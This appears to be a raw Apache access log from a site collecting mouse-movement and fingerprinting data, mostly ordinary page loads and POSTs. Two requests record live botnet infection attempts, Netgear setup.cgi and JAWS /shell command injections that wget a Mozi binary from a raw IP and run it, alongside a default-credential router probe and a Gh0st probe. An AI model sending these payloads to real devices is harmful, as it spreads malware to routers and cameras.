- - [29/Nov/2020:09:19:55 +0000] "GET / HTTP/1.1" 200 3970 "-" - "-"
- - [29/Nov/2020:09:19:56 +0000] "GET / HTTP/1.1" 200 2807 "-" - "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
- - [29/Nov/2020:10:51:55 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 1835 "-" - "-"
- - [29/Nov/2020:11:33:28 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.46.161.232:40999/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1835 "-" - "-"
- - [29/Nov/2020:15:36:21 +0000] "Gh0st\xad" 400 0 "-" - "-"
- - [29/Nov/2020:17:19:21 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://182.116.50.118:43976/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 1872 "-" - "Hello, world"
- - [29/Nov/2020:17:42:26 +0000] "GET / HTTP/1.1" 200 1309 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
- - [29/Nov/2020:17:43:51 +0000] "GET / HTTP/1.1" 200 1309 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:43:58 +0000] "GET /css/main.css HTTP/1.1" 200 739 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:43:58 +0000] "GET /js/initialise_vars.js HTTP/1.1" 200 599 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:43:58 +0000] "GET /js/cookies_functions.js HTTP/1.1" 200 835 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:43:58 +0000] "GET /js/fingerprint_browser.js HTTP/1.1" 200 1048 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:43:58 +0000] "GET /js/mousemove_onclick.js HTTP/1.1" 200 398 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:43:58 +0000] "GET /js/mousemove_ontimeout.js HTTP/1.1" 200 1262 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:03 +0000] "OPTIONS * HTTP/1.0" 200 110 "-" - "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
- - [29/Nov/2020:17:44:08 +0000] "GET /favicon.ico HTTP/1.1" 200 400 "-" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:29 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:29 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:30 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:31 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:32 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:33 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:34 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:35 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:36 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:37 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:38 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:39 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:40 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
- - [29/Nov/2020:17:44:41 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" f8mmn03rdoojfjb50ma70ii8pg "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0"
